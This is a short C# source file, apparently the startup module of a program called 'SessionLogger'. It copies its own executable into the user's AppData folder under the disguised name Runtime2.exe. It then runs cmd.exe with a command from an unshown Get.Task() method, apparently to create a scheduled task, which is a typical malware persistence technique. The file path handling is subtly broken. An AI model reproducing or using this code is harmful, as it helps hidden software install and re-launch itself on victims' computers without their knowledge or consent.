using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;

namespace SessionLogger.Logger
{
    class Startup
    {
        public static void add()
        {
            copy();
            TaskSchedule();
        }

        public static void copy()
        {

            string path = Get.Appdata() + @"\Runtime2.exe";

            bool fileExist = File.Exists(path);
            if (!fileExist)
            {
                String fileName = String.Concat(Process.GetCurrentProcess().ProcessName, ".exe");
                String filePath = Path.Combine(Environment.CurrentDirectory, fileName);
                File.Copy(filePath, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"\Runtime2.exe"));
                TaskSchedule();
            }
            else
            {
                
            }

        }

        public static void TaskSchedule()
        {
            
                string commandParams = Get.Task();
                Process.Start("cmd.exe", " /c " + commandParams);
            
            
        }
    }
}
